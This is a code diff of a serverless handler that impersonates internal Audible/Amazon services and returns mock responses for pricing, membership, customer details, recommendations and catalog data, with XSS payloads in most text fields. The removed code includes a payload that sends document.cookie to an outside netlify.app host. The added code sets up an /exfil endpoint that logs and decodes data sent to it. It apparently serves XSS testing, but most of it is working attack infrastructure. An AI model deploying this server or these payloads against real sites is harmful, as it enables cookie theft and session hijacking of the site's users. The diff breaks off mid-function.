@@ -1,618 +1,666 @@
 exports.handler = async (event) => {
-  // Log the incoming request for debugging
   const headers = event.headers || {};
   const target = headers['x-amz-target'] || headers['x-amzn-target'] || '';
-  const contentType = headers['content-type'] || '';
   const path = event.path || '';
   const body = event.body || '';
 
-  console.log('=== Incoming Request ===');
-  console.log('Path:', path);
-  console.log('Method:', event.httpMethod);
-  console.log('Target:', target);
-  console.log('Content-Type:', contentType);
-  console.log('Headers:', JSON.stringify(headers, null, 2));
-  console.log('Body:', body.substring(0, 500));
+  console.log('=== Request ===', event.httpMethod, path, 'Target:', target);
+  console.log('Body:', body.substring(0, 300));
 
   // Handle OPTIONS preflight
   if (event.httpMethod === 'OPTIONS') {
-    return {
-      statusCode: 200,
-      headers: {
-        "Access-Control-Allow-Origin": "*",
-        "Access-Control-Allow-Headers": "*",
-        "Access-Control-Allow-Methods": "POST, GET, OPTIONS, PUT"
-      },
-      body: ''
-    };
+    return { statusCode: 200, headers: corsHeaders(), body: '' };
   }
 
-  // XSS Payloads - vary these to test different rendering contexts
-  const XSS = {
-    img: '<img src=x onerror="alert(document.domain)">',
-    svg: '<svg/onload=alert(document.domain)>',
-    script: '<script>alert(document.domain)</script>',
-    iframe: '<iframe src="javascript:alert(document.domain)"></iframe>',
-    event: '" onmouseover="alert(document.domain)" data-x="',
-    steal: '<img src=x onerror="new Image().src=\'https://comfy-daffodil-485f41.netlify.app/steal?c=\'+document.cookie">',
-    polyglot: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>'
-  };
+  // Handle exfil endpoint
+  if (path.includes('/exfil')) {
+    console.log('=== EXFIL ===');
+    console.log('Query:', JSON.stringify(event.queryStringParameters));
+    console.log('Body:', body);
+    if (event.queryStringParameters && event.queryStringParameters.d) {
+      try { console.log('Decoded:', Buffer.from(event.queryStringParameters.d, 'base64').toString()); } catch(e) {}
+    }
+    return { statusCode: 200, headers: corsHeaders(), body: 'ok' };
+  }
+
+  const XSS = '<img src=x onerror="alert(document.domain)">';
 
   let response;
 
-  // Route based on x-amz-target header (Coral operation routing)
+  // Route based on Coral operation header
   if (target.includes('getPrices') || target.includes('PriceAggregator')) {
-    response = buildGetPricesResponse(XSS);
-  } else if (target.includes('saleDetailsByTag') || (target.includes('PriceAggregator') && body.includes('saleDetailsByTag'))) {
-    response = buildSaleDetailsByTagResponse(XSS);
+    response = getPricesResponse(XSS);
+  } else if (target.includes('saleDetailsByTag')) {
+    response = saleDetailsByTagResponse(XSS);
   } else if (target.includes('getMemberships') || target.includes('MembershipInformation')) {
-    response = buildGetMembershipsResponse(XSS);
+    response = getMembershipsResponse(XSS);
+  } else if (target.includes('getCreditSummary')) {
+    response = getCreditSummaryResponse(XSS);
   } else if (target.includes('GetMembershipPlanDetails') || target.includes('MembershipDataServiceV2')) {
-    response = buildGetMembershipPlanDetailsResponse(XSS);
-  } else if (target.includes('GetCustomerStatus') || (target.includes('AccountData') && body.includes('CustomerStatus'))) {
-    response = buildGetCustomerStatusResponse(XSS);
+    response = getMembershipPlanDetailsResponse(XSS);
+  } else if (target.includes('GetCustomerStatus') || target.includes('AccountData')) {
+    response = getCustomerStatusResponse(XSS);
+  } else if (target.includes('GetCustomerInformation')) {
+    response = getCustomerInformationResponse(XSS);
   } else if (target.includes('getWidgets') || target.includes('RecommenderStrategy')) {
-    response = buildGetWidgetsResponse(XSS);
+    response = getWidgetsResponse(XSS);
   } else if (target.includes('findExtraCreditOffers') || target.includes('SaleEligibility')) {
-    response = buildFindExtraCreditOffersResponse(XSS);
+    response = findExtraCreditOffersResponse(XSS);
   } else if (target.includes('GetCustomerIdMapping') || target.includes('CustomerAttribute')) {
-    response = buildGetCustomerIdMappingResponse(XSS);
+    response = getCustomerIdMappingResponse(XSS);
+  } else if (target.includes('GetCOR')) {
+    response = getCORResponse(XSS);
   } else if (target.includes('GetDynamicPages') || target.includes('DynamicRanking')) {
-    response = buildGetDynamicPagesResponse(XSS);
+    response = getDynamicPagesResponse(XSS);
   } else if (target.includes('GetProducts') || target.includes('CatalogData')) {
-    response = buildGetProductsResponse(XSS);
-  } else if (target.includes('GetCustomerInformation') || (target.includes('AccountData') && body.includes('CustomerInformation'))) {
-    response = buildGetCustomerInformationResponse(XSS);
-  } else if (target.includes('getCreditSummary') || (target.includes('MembershipInformation') && body.includes('creditSummary'))) {
-    response = buildGetCreditSummaryResponse(XSS);
+    response = getProductsResponse(XSS);
   } else if (target.includes('getCartCount') || target.includes('CartService')) {
-    response = buildGetCartCountResponse(XSS);
-  } else if (target.includes('GetCOR') || (target.includes('CustomerAttribute') && body.includes('COR'))) {
-    response = buildGetCORResponse(XSS);
+    response = getCartCountResponse(XSS);
   } else if (target.includes('getCustomerNotifications') || target.includes('CustomerOnboarding')) {
-    response = buildGetCustomerNotificationsResponse(XSS);
+    response = getCustomerNotificationsResponse(XSS);
   } else if (target.includes('GetIPInfo') || target.includes('IPLocationScout')) {
-    response = buildGetIPInfoResponse(XSS);
+    response = getIPInfoResponse(XSS);
   } else {
-    // Default fallback
-    response = buildGenericResponse(XSS, target, body);
+    response = genericResponse(XSS, target);
   }
 
   return {
     statusCode: 200,
-    headers: {
-      "Content-Type": "application/json",
-      "Access-Control-Allow-Origin": "*",
-      "Access-Control-Allow-Headers": "*",
-      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
-      "x-amzn-RequestId": "fake-xss-test-" + Date.now()
-    },
+    headers: corsHeaders(),
     body: JSON.stringify(response)
   };
 };
 
+function corsHeaders() {
+  return {
+    "Content-Type": "application/json",
+    "Access-Control-Allow-Origin": "*",
+    "Access-Control-Allow-Headers": "*",
+    "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
+    "x-amzn-RequestId": "xss-" + Date.now()
+  };
+}
+
 // ============================================================
 // AudiblePriceAggregatorService::getPrices
-// Returns pricing info displayed in buy boxes and product pages
+// Fields: pricing[].priceMap.{}.promotionList[].promotionDesc,
+//         pricing[].priceMap.{}.promotionList[].promotionType,
+//         audibleMessageList[].message
 // ============================================================
-function buildGetPricesResponse(XSS) {
+function getPricesResponse(XSS) {
   return {
-    "Output": {
-      "__type": "com.amazon.audiblepriceaggregatorservice#GetPricesResponse",
-      "prices": [
-        {
-          "asin": "B0GXGLXFWR",
-          "listPrice": {
-            "amount": "29.99",
-            "currency": "USD",
-            "displayText": XSS.img
+    customerId: "cust-xss-001",
+    marketplaceId: "AF2M0KC94RCEA",
+    merchantId: "merchant-001",
+    associateCode: "",
+    conditionalContextFlag: false,
+    requestDuration: 42,
+    audibleMessageList: [
+      { code: "100", message: "SUCCESS" }
+    ],
+    pricing: [
+      {
+        asin: "B0GXGLXFWR",
+        sku: "SK_XSS_001",
+        customersBestPrice: "sale",
+        priceMap: {
+          "list": {
+            priceType: "list",
+            actualPrice: { value: 29.99, unit: "USD" },
+            merchantId: "merchant-001",
+            offerListingId: "offer-001",
+            promotionList: [
+              {
+                promotionId: "",
+                promotionType: "List",
+                promotionValue: "0",
+                promotionDesc: XSS,
+                promotionClaimCode: ""
+              }
+            ]
           },
-          "memberPrice": {
-            "amount": "0.00",
-            "currency": "USD",
-            "displayText": XSS.svg
+          "member": {
+            priceType: "member",
+            actualPrice: { value: 20.99, unit: "USD" },
+            merchantId: "merchant-001",
+            offerListingId: "offer-002",
+            promotionList: [
+              {
+                promotionId: "promo-xss",
+                promotionType: XSS,
+                promotionValue: "30",
+                promotionDesc: XSS,
+                promotionClaimCode: ""
+              }
+            ]
           },
-          "savingsMessage": XSS.img,
-          "promotionalText": XSS.script,
-          "priceType": "REGULAR",
-          "creditEligible": true
+          "sale": {
+            priceType: "sale",
+            actualPrice: { value: 4.95, unit: "USD" },
+            merchantId: "merchant-001",
+            offerListingId: "offer-003",
+            promotionList: [
+              {
+                promotionId: "sale-xss",
+                promotionType: XSS,
+                promotionValue: "83",
+                promotionDesc: XSS,
+                promotionClaimCode: ""
+              }
+            ],
+            saleDetail: {
+              saleRuleId: "rule-xss",
+              saleType: "percentage",
+              saleStartDate: "2025-06-01T00:00:00Z",
+              saleEndDate: "2025-12-31T23:59:59Z",
+              saleDiscountPercentage: 83.0,
+              saleTag: "DAILYDEAL"
+            }
+          },
+          "credit": {
+            priceType: "credit",
+            actualPrice: { value: 0, unit: "USD" },
+            creditPrice: 1.0,
+            merchantId: "merchant-001",
+            offerListingId: "offer-004",
+            promotionList: []
+          }
         }
-      ]
-    },
-    "Version": "1.0"
+      }
+    ]
   };
 }
 
 // ============================================================
 // AudiblePriceAggregatorService::saleDetailsByTag
-// Returns sale/promotion display info
+// Fields: saleTag, responseCodeTypes[].responseMessage
+// (Mostly ASINs - limited XSS surface)
 // ============================================================
-function buildSaleDetailsByTagResponse(XSS) {
+function saleDetailsByTagResponse(XSS) {
   return {
-    "Output": {
-      "__type": "com.amazon.audiblepriceaggregatorservice#SaleDetailsByTagResponse",
-      "saleDetails": [
-        {
-          "tag": "summer-sale-2025",
-          "title": XSS.img,
-          "description": XSS.script,
-          "bannerText": XSS.svg,
-          "discountPercentage": 50,
-          "startDate": "2025-06-01T00:00:00Z",
-          "endDate": "2025-08-31T23:59:59Z",
-          "ctaText": XSS.img,
-          "ctaUrl": "javascript:alert(document.domain)"
-        }
-      ]
-    },
-    "Version": "1.0"
+    marketplaceId: "AF2M0KC94RCEA",
+    saleTag: XSS,
+    asinTypes: [
+      { asin: "B0GXGLXFWR" },
+      { asin: "B0TESTXSS1" }
+    ],
+    displayOnHomepageAsinTypes: [
+      { asin: "B0GXGLXFWR" }
+    ],
+    responseCodeTypes: [
+      { responseCode: "100", responseMessage: XSS }
+    ]
   };
 }
 
 // ============================================================
 // AudibleMembershipInformationService::getMemberships
-// Returns membership status/plan info displayed on account pages
+// Fields: userMembershipPlanList[].offerListing.name,
+//         .barkerName, .description
 // ============================================================
-function buildGetMembershipsResponse(XSS) {
+function getMembershipsResponse(XSS) {
   return {
-    "Output": {
-      "__type": "com.amazon.audiblemembershipinformationservice#GetMembershipsResponse",
-      "memberships": [
-        {
-          "membershipId": "mem-xss-001",
-          "planName": XSS.img,
-          "planDescription": XSS.script,
-          "status": "ACTIVE",
-          "startDate": "2024-01-01T00:00:00Z",
-          "nextBillingDate": "2025-07-15T00:00:00Z",
-          "price": {
-            "amount": "14.95",
-            "currency": "USD",
-            "displayText": XSS.svg
-          },
-          "benefits": [
-            XSS.img,
-            "1 credit per month " + XSS.svg
-          ],
-          "tierName": XSS.img
-        }
-      ]
-    },
-    "Version": "1.0"
-  };
-}
-
-// ============================================================
-// AudibleApiMembershipDataServiceV2::GetMembershipPlanDetails
-// Returns plan details for membership pages
-// ============================================================
-function buildGetMembershipPlanDetailsResponse(XSS) {
-  return {
-    "Output": {
-      "__type": "com.amazon.audibleapimembershipdataservicev2#GetMembershipPlanDetailsResponse",
-      "plans": [
-        {
-          "planId": "plan-gold-monthly",
-          "planName": XSS.img,
-          "planDescription": XSS.script,
-          "price": {
-            "amount": "14.95",
-            "displayText": XSS.svg
-          },
-          "creditsPerMonth": 1,
-          "trialDays": 30,
-          "features": [
-            XSS.img,
-            "Access to Plus Catalog " + XSS.svg,
-            XSS.script
-          ],
-          "promotionalBadge": XSS.img,
-          "savingsText": XSS.svg
+    errors: [{ code: "100", message: "SUCCESS" }],
+    userMembershipPlanList: [
+      {
+        subscription: {
+          subscriptionID: "sub-xss-001",
+          customerID: "cust-xss-001",
+          marketplaceID: "AF2M0KC94RCEA",
+          planID: "plan-gold",
+          serviceProviderID: "audible",
+          status: "Active",
+          statusStartDate: "2024-01-01T00:00:00Z",
+          subscriptionStartDate: "2020-03-15T00:00:00Z",
+          nextBillDate: "2025-08-01T00:00:00Z",
+          nextBillAmount: { value: 14.95, unit: "USD" },
+          autoRenewEnabled: true,
+          baseCurrencyCode: "USD"
         },
-        {
-          "planId": "plan-platinum-annual",
-          "planName": "Platinum Annual " + XSS.svg,
-          "planDescription": "24 credits per year " + XSS.img,
-          "price": {
-            "amount": "149.50",
-            "displayText": XSS.img
-          },
-          "creditsPerMonth": 2,
-          "features": [
-            XSS.script
-          ]
-        }
-      ]
-    },
-    "Version": "1.0"
-  };
-}
-
-// ============================================================
-// AudibleApiAccountDataService::GetCustomerStatus
-// Returns customer account status
-// ============================================================
-function buildGetCustomerStatusResponse(XSS) {
-  return {
-    "Output": {
-      "__type": "com.amazon.audibleapiaccountdataservice#GetCustomerStatusResponse",
-      "customerStatus": {
-        "customerId": "cust-xss-001",
-        "status": "ACTIVE",
-        "statusMessage": XSS.img,
-        "memberSince": "2020-03-15T00:00:00Z",
-        "marketplace": "US",
-        "displayName": XSS.svg,
-        "tierName": XSS.img,
-        "accountAlerts": [
-          {
-            "alertType": "INFO",
-            "message": XSS.script,
-            "ctaText": XSS.img,
-            "ctaUrl": "javascript:alert(document.domain)"
-          }
-        ]
+        offerListing: {
+          offerListingId: 12345,
+          groupId: 1,
+          sku: "SKU_XSS",
+          name: XSS,
+          barkerName: XSS,
+          description: XSS,
+          marketplaceId: "AF2M0KC94RCEA",
+          currencyCode: "USD",
+          asin: "B0PLANXSS01",
+          productGroup: 1,
+          contractLength: 1,
+          contractLengthUnit: "MONTH",
+          active: true,
+          searchable: true,
+          deleted: false
+        },
+        activeOfferListing: {
+          offerListingId: 12345,
+          name: XSS,
+          barkerName: XSS,
+          description: XSS,
+          sku: "SKU_XSS_ACTIVE",
+          active: true
+        },
+        futureOfferListing: null,
+        creditCount: 3,
+        accessTokenCount: 0,
+        accessViaMusicTokenCount: 0,
+        hasTrial: false,
+        futureCancellationDate: null,
+        expectedEndDate: null
       }
-    },
-    "Version": "1.0"
-  };
-}
-
-// ============================================================
-// RecommenderStrategyService::getWidgets
-// Returns widget/carousel content for homepage and browse pages
-// ============================================================
-function buildGetWidgetsResponse(XSS) {
-  return {
-    "Output": {
-      "__type": "com.amazon.recommenderstrategyservice#GetWidgetsResponse",
-      "widgets": [
-        {
-          "widgetId": "widget-xss-1",
-          "widgetType": "CAROUSEL",
-          "title": XSS.img,
-          "subtitle": XSS.svg,
-          "items": [
-            {
-              "asin": "B0RECXSS01",
-              "title": XSS.img,
-              "author": XSS.svg,
-              "narrator": XSS.img,
-              "imageUrl": "https://m.media-amazon.com/images/I/placeholder.jpg",
-              "rating": 4.5,
-              "reasoning": "Because you enjoyed " + XSS.img
-            },
-            {
-              "asin": "B0RECXSS02",
-              "title": XSS.script,
-              "author": "Author " + XSS.event,
-              "imageUrl": "https://m.media-amazon.com/images/I/placeholder.jpg",
-              "rating": 4.8,
-              "reasoning": XSS.svg
-            }
-          ],
-          "seeMoreText": XSS.img,
-          "seeMoreUrl": "javascript:alert(document.domain)"
-        },
-        {
-          "widgetId": "widget-xss-2",
-          "widgetType": "BANNER",
-          "title": XSS.svg,
-          "html": "<div class='promo-banner'>" + XSS.script + "</div>",
-          "content": XSS.polyglot
-        }
-      ]
-    },
-    "Version": "1.0"
-  };
-}
-
-// ============================================================
-// AudibleSaleEligibilityAndOfferService::findExtraCreditOffers
-// Returns extra credit purchase options
-// ============================================================
-function buildFindExtraCreditOffersResponse(XSS) {
-  return {
-    "Output": {
-      "__type": "com.amazon.audiblesaleeligibilityandofferservice#FindExtraCreditOffersResponse",
-      "offers": [
-        {
-          "offerId": "offer-xss-1",
-          "offerName": XSS.img,
-          "description": XSS.script,
-          "credits": 3,
-          "price": {
-            "amount": "35.88",
-            "displayText": XSS.svg
-          },
-          "savingsText": XSS.img,
-          "promotionalBadge": XSS.svg,
-          "eligibilityMessage": XSS.img
-        },
-        {
-          "offerId": "offer-xss-2",
-          "offerName": "1 Extra Credit " + XSS.svg,
-          "description": "Add a credit to your account " + XSS.img,
-          "credits": 1,
-          "price": {
-            "amount": "14.95",
-            "displayText": XSS.img
-          }
-        }
-      ]
-    },
-    "Version": "1.0"
-  };
-}
-
-// ============================================================
-// AudibleCustomerAttributeService::GetCustomerIdMapping
-// Returns customer ID mapping data
-// ============================================================
-function buildGetCustomerIdMappingResponse(XSS) {
-  return {
-    "Output": {
-      "__type": "com.amazon.audiblecustomerattributeservice#GetCustomerIdMappingResponse",
-      "mapping": {
-        "customerId": "cust-xss-001",
-        "directedId": "amzn1.account.XSS_TEST_ID",
-        "marketplace": "ATVPDKIKX0DER",
-        "displayName": XSS.img,
-        "email": XSS.svg,
-        "accountType": "STANDARD"
-      }
-    },
-    "Version": "1.0"
-  };
-}
-
-// ============================================================
-// AudibleDynamicRankingService::GetDynamicPages
-// Returns page configuration with slot/zone content
-// ============================================================
-function buildGetDynamicPagesResponse(XSS) {
-  return {
-    "Output": {
-      "__type": "com.amazon.audibledynamicrankingservice#GetDynamicPagesResponse",
-      "dynamicPageKeys": [
-        {
-          "pageType": XSS.img,
-          "pageId": XSS.svg
-        },
-        {
-          "pageType": "homepage",
-          "pageId": XSS.script
-        },
-        {
-          "pageType": XSS.script,
-          "pageId": "category-bestsellers"
-        }
-      ]
-    },
-    "Version": "1.0"
-  };
-}
-
-// ============================================================
-// AudibleApiCatalogDataService::GetProducts
-// Returns product metadata (titles, descriptions, authors)
-// ============================================================
-function buildGetProductsResponse(XSS) {
-  return {
-    "Output": {
-      "__type": "com.amazon.audibleapicatalogdata#GetProductsResponse",
-      "products": [
-        {
-          "asin": "B0GXGLXFWR",
-          "title": XSS.img,
-          "subtitle": XSS.svg,
-          "authors": [
-            {"name": XSS.img, "asin": "AUTHXSS01"}
-          ],
-          "narrators": [
-            {"name": XSS.svg}
-          ],
-          "description": "<p>" + XSS.script + "</p>",
-          "publisher": XSS.img,
-          "release_date": "2025-01-01",
-          "language": "en-US",
-          "runtime_length_min": 300,
-          "format_type": "unabridged",
-          "product_images": {
-            "500": "https://m.media-amazon.com/images/I/placeholder.jpg"
-          },
-          "series": [
-            {"title": XSS.img, "asin": "SERIESXSS", "sequence": "1"}
-          ],
-          "categories": [
-            {"name": XSS.svg, "id": "cat-xss"}
-          ]
-        }
-      ]
-    },
-    "Version": "1.0"
-  };
-}
-
-// ============================================================
-// AudibleApiAccountDataService::GetCustomerInformation
-// Returns PII-rich customer data (name, email, etc.)
-// ============================================================
-function buildGetCustomerInformationResponse(XSS) {
-  return {
-    "Output": {
-      "__type": "com.amazon.audibleapiaccountdataservice#GetCustomerInformationResponse",
-      "customerInformation": {
-        "customerId": "cust-xss-001",
-        "firstName": XSS.img,
-        "lastName": XSS.svg,
-        "email": XSS.img,
-        "displayName": XSS.script,
-        "marketplace": "US",
-        "locale": "en_US",
-        "memberSince": "2020-03-15T00:00:00Z",
-        "accountStatus": "ACTIVE"
-      }
-    },
-    "Version": "1.0"
+    ]
   };
 }
 
 // ============================================================
 // AudibleMembershipInformationService::getCreditSummary
-// Returns credit balance info displayed on account/library pages
+// Fields: mostly numeric, limited XSS surface
 // ============================================================
-function buildGetCreditSummaryResponse(XSS) {
+function getCreditSummaryResponse(XSS) {
   return {
-    "Output": {
-      "__type": "com.amazon.audiblemembershipinformationservice#GetCreditSummaryResponse",
-      "creditSummary": {
-        "availableCredits": 3,
-        "creditDisplayText": XSS.img,
-        "nextCreditDate": "2025-07-15T00:00:00Z",
-        "nextCreditMessage": XSS.svg,
-        "expiringCredits": [
-          {
-            "count": 1,
-            "expirationDate": "2025-08-01T00:00:00Z",
-            "expirationMessage": XSS.img
-          }
-        ],
-        "promotionalMessage": XSS.script
-      }
+    numOfActiveCredits: 3.0,
+    creditArrivalInfo: {
+      nextCreditArrivalDate: "2025-08-01T00:00:00Z",
+      numOfCreditsToBeIssued: 1.0
     },
-    "Version": "1.0"
+    totalNumOfCreditsExpiringWithinThreshold: 1.0,
+    expiringCreditsInfoList: [
+      { numOfDaysToExpiration: 30, totalNumOfExpiringCredits: 1.0 }
+    ],
+    summary: {
+      credit: {
+        numOfActive: 3.0,
+        totalNumOfExpiringWithinThreshold: 1.0,
+        arrivalInfo: { nextArrivalDate: "2025-08-01T00:00:00Z", numToBeIssued: 1.0 },
+        expiringInfoList: [{ numOfDaysToExpiration: 30, totalNumOfExpiring: 1.0 }]
+      },
+      accessToken: {
+        numOfActive: 0,
+        totalNumOfExpiringWithinThreshold: 0,
+        arrivalInfo: null,
+        expiringInfoList: []
+      },
+      accessViaMusicToken: {
+        numOfActive: 0,
+        totalNumOfExpiringWithinThreshold: 0,
+        arrivalInfo: null,
+        expiringInfoList: []
+      }
+    }
   };
 }
 
 // ============================================================
-// AudibleCartService::getCartCount
-// Returns cart item count for nav badge
+// AudibleApiMembershipDataServiceV2::GetMembershipPlanDetails
+// Fields: membershipPlanDetails.title, .description,
+//         offers[].planItems[].schedules[].contracts[].metadata.name,
+//         .description, .barkerName, .alternativeName,
+//         .alternativeDescription, .contractName,
+//         benefits[].title, benefits[].description
 // ============================================================
-function buildGetCartCountResponse(XSS) {
+function getMembershipPlanDetailsResponse(XSS) {
   return {
-    "Output": {
-      "__type": "com.amazon.audiblecartservice#GetCartCountResponse",
-      "cartCount": 99,
-      "displayText": XSS.img,
-      "cartBadgeHtml": XSS.script
+    response_groups: ["plan_metadata", "benefit_metadata"],
+    membership_plan_details: {
+      asin: "B0PLANXSS01",
+      source: "Audible",
+      service_provider_id: "audible",
+      marketplace_id: "AF2M0KC94RCEA",
+      merchant_id: "merchant-001",
+      product_group: "audible_membership",
+      title: XSS,
+      description: XSS,
+      payment_profile: "default",
+      offers: [
+        {
+          offer_listing_id: "offer-xss-001",
+          sku: "SKU_GOLD_MONTHLY",
+          seller_id: "seller-001",
+          seller_of_record_id: "sor-001",
+          tax_price_type: "Exclusive",
+          plan_items: [
+            {
+              schedules: [
+                {
+                  contracts: [
+                    {
+                      index: 0,
+                      renewal_policy: "auto_renew",
+                      execution_times: 0,
+                      billing_periods: [
+                        {
+                          index: 0,
+                          execution_times: 0,
+                          duration: { value: 1, unit: "MONTH" },
+                          value_without_tax: { amount: 14.95, currency: "USD" },
+                          value_with_tax: { amount: 14.95, currency: "USD" }
+                        }
+                      ],
+                      metadata: {
+                        plan_id: "B0PLANXSS01",
+                        name: XSS,
+                        offer_type: "FullPrice",
+                        plan_group_type: "Gold",
+                        program_type: "Default",
+                        business_model: "subscription",
+                        business_submodel: "credit",
+                        contract_name: XSS,
+                        description: XSS,
+                        alternative_name: XSS,
+                        alternative_description: XSS,
+                        barker_name: XSS,
+                        base_plan_sku: "SKU_GOLD_BASE",
+                        is_introductory_offer: false,
+                        is_searchable: true,
+                        is_buyable: true,
+                        is_auto_renew_enabled: true,
+                        credit_bankable_limit: 6,
+                        credit_revenue: 9.56,
+                        benefits: [
+                          {
+                            type: "CreditBenefit",
+                            title: XSS,
+                            description: XSS,
+                            credit: 1.0
+                          },
+                          {
+                            type: "AYCEBenefit",
+                            title: XSS,
+                            description: XSS
+                          }
+                        ]
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
     },
-    "Version": "1.0"
+    membership_plan_details_map: null
+  };
+}
+
+// ============================================================
+// AudibleApiAccountDataService::GetCustomerStatus
+// (Model not in local code - using common account data patterns)
+// ============================================================
+function getCustomerStatusResponse(XSS) {
+  return {
+    customer_status: {
+      customer_id: "cust-xss-001",
+      marketplace_id: "AF2M0KC94RCEA",
+      status: "Active",
+      is_member: true,
+      display_name: XSS,
+      tier_name: XSS
+    }
+  };
+}
+
+// ============================================================
+// AudibleApiAccountDataService::GetCustomerInformation
+// (Model not in local code - using common account data patterns)
+// ============================================================
+function getCustomerInformationResponse(XSS) {
+  return {
+    customer_information: {
+      customer_id: "cust-xss-001",
+      first_name: XSS,
+      last_name: XSS,
+      email: XSS,
+      marketplace_id: "AF2M0KC94RCEA",
+      locale: "en_US"
+    }
+  };
+}
+
+// ============================================================
+// RecommenderStrategyService::getWidgets
+// Fields: widgets[].title.value, widgets[].subtitle.value,
+//         widgets[].metadata (Map<String,String>)
+// This is a TOP XSS candidate - widget titles rendered in carousels
+// ============================================================
+function getWidgetsResponse(XSS) {
+  return {
+    widgets: [
+      {
+        widgetId: "widget-xss-hero",
+        strategyId: "strategy-homepage-hero",
+        reftag: "hp_hero_xss",
+        title: { value: XSS, type: { type: "plain" } },
+        subtitle: { value: XSS, type: { type: "plain" } },
+        score: 1.0,
+        linkParameters: { plink: "/cat/bestsellers" },
+        metadata: {
+          dcloInnerStrategyId: "inner-strat-001",
+          strategyToken: "token-xss-001",
+          hasNext: "true"
+        },
+        recommendations: [
+          {
+            id: "B0GXGLXFWR",
+            dataType: "Product",
+            score: 0.95,
+            reasons: [
+              { id: "B0PREVBOOK1", causeType: "purchase", contribution: 0.8, reasonType: "collaborative" }
+            ],
+            metadata: { title: XSS, author: XSS }
+          },
+          {
+            id: "B0TESTXSS1",
+            dataType: "Product",
+            score: 0.90,
+            reasons: [
+              { id: "B0PREVBOOK2", causeType: "listen", contribution: 0.7, reasonType: "content_based" }
+            ],
+            metadata: { title: XSS, author: XSS }
+          }
+        ]
+      },
+      {
+        widgetId: "widget-xss-carousel",
+        strategyId: "strategy-for-you",
+        reftag: "hp_carousel_xss",
+        title: { value: XSS, type: { type: "plain" } },
+        subtitle: { value: XSS, type: { type: "plain" } },
+        score: 0.8,
+        linkParameters: { plink: "/recommendations" },
+        metadata: {
+          strategyToken: "token-xss-002",
+          hasNext: "false"
+        },
+        recommendations: [
+          {
+            id: "B0RECXSS01",
+            dataType: "Product",
+            score: 0.85,
+            reasons: [],
+            metadata: { title: XSS }
+          }
+        ]
+      }
+    ],
+    metadata: {
+      strategyToken: "global-token-xss",
+      strategyTokenMap: "{}"
+    }
+  };
+}
+
+// ============================================================
+// AudibleSaleEligibilityAndOfferService::findExtraCreditOffers
+// Fields: offerAsin, offerAsinList[].asin, .productId, .weblab
+// (Mostly IDs - limited XSS surface)
+// ============================================================
+function findExtraCreditOffersResponse(XSS) {
+  return {
+    offerAsin: "B0EXTRACRED1",
+    offerAsinList: [
+      {
+        asin: "B0EXTRACRED1",
+        creditBundleSize: 3.0,
+        productId: XSS,
+        weblab: XSS
+      },
+      {
+        asin: "B0EXTRACRED2",
+        creditBundleSize: 1.0,
+        productId: XSS,
+        weblab: ""
+      }
+    ]
+  };
+}
+
+// ============================================================
+// AudibleCustomerAttributeService::GetCustomerIdMapping
+// (Model not in local code)
+// ============================================================
+function getCustomerIdMappingResponse(XSS) {
+  return {
+    customerId: "cust-xss-001",
+    directedId: "amzn1.account.XSSTESTID",
+    marketplace: "ATVPDKIKX0DER",
+    displayName: XSS
   };
 }
 
 // ============================================================
 // AudibleCustomerAttributeService::GetCOR
-// Returns Customer of Record data
+// (Model not in local code)
 // ============================================================
-function buildGetCORResponse(XSS) {
+function getCORResponse(XSS) {
   return {
-    "Output": {
-      "__type": "com.amazon.audiblecustomerattributeservice#GetCORResponse",
-      "cor": {
-        "customerId": "cust-xss-001",
-        "countryOfResidence": XSS.img,
-        "marketplace": "ATVPDKIKX0DER",
-        "displayName": XSS.svg,
-        "accountLabel": XSS.img,
-        "territory": XSS.script
+    customerId: "cust-xss-001",
+    countryOfResidence: "US",
+    marketplace: "ATVPDKIKX0DER"
+  };
+}
+
+// ============================================================
+// AudibleDynamicRankingService::GetDynamicPages
+// Fields: dynamicPageKeys[].pageType, .pageId
+// ============================================================
+function getDynamicPagesResponse(XSS) {
+  return {
+    dynamicPageKeys: [
+      { pageType: "homepage", pageId: "homepage-default" },
+      { pageType: XSS, pageId: XSS }
+    ]
+  };
+}
+
+// ============================================================
+// AudibleApiCatalogDataService::GetProducts
+// Fields: products[].title, .subtitle, .authors[].name,
+//         .narrators[].name, .description, .publisher,
+//         .series[].title, .categories[].name
+// TOP XSS candidate - product data rendered on PDP
+// ============================================================
+function getProductsResponse(XSS) {
+  return {
+    products: [
+      {
+        asin: "B0GXGLXFWR",
+        title: XSS,
+        subtitle: XSS,
+        authors: [{ name: XSS, asin: "AUTHXSS01" }],
+        narrators: [{ name: XSS }],
+        description: XSS,
+        publisher: XSS,
+        release_date: "2025-01-01",
+        language: "en-US",
+        runtime_length_min: 300,
+        format_type: "unabridged",
+        product_images: { "500": "https://m.media-amazon.com/images/I/placeholder.jpg" },
+        series: [{ title: XSS, asin: "SERIESXSS", sequence: "1" }],
+        categories: [{ name: XSS, id: "cat-xss" }]
       }
-    },
-    "Version": "1.0"
+    ]
+  };
+}
+
+// ============================================================
+// AudibleCartService::getCartCount
+// Fields: numOfItems (int), errors[].message
+// (Minimal - mostly numeric)
+// ============================================================
+function getCartCountResponse(XSS) {
+  return {
+    numOfItems: 99,
+    errors: [{ code: "100", message: XSS, asin: "", sku: "", keyValueMap: {} }]
   };
 }
 
 // ============================================================
 // AudibleCustomerOnboardingService::getCustomerNotifications
-// Returns notifications/banners displayed on pages
+// (Model not in local code - using inferred structure)
 // ============================================================
-function buildGetCustomerNotificationsResponse(XSS) {
+function getCustomerNotificationsResponse(XSS) {
   return {
-    "Output": {
-      "__type": "com.amazon.audiblecustomeronboarding#GetCustomerNotificationsResponse",
-      "notifications": [
-        {
-          "notificationId": "notif-xss-1",
-          "type": "BANNER",
-          "title": XSS.img,
-          "message": XSS.script,
-          "htmlContent": "<div class='notification-banner'>" + XSS.script + "</div>",
-          "ctaText": XSS.svg,
-          "ctaUrl": "javascript:alert(document.domain)",
-          "dismissible": true,
-          "priority": 1
-        },
-        {
-          "notificationId": "notif-xss-2",
-          "type": "MODAL",
-          "title": "Welcome back! " + XSS.svg,
-          "message": "Check out what's new " + XSS.img,
-          "htmlContent": "<div>" + XSS.polyglot + "</div>",
-          "ctaText": "Explore " + XSS.event,
-          "dismissible": false,
-          "priority": 2
-        }
-      ]
-    },
-    "Version": "1.0"
+    notifications: [
+      {
